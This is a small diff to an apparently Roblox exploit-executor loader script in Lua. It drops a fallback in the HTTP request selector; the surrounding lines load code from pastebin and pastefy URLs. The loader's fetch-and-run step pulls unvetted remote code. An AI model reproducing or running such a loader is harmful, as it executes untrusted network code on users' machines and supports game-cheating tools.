@@ -1,4 +1,4 @@
-local http_requesting = request or http_request or (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request) or blankfunction
+local http_requesting = request or http_request or (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request)
 
 local function try_load(urls)
     for _, url in ipairs(urls) do
@@ -24,3 +24,4 @@ try_load({
     "https://pastebin.com/raw/azPSzEjH",
     "https://pastefy.app/SiDMhe47/raw",
 })
+
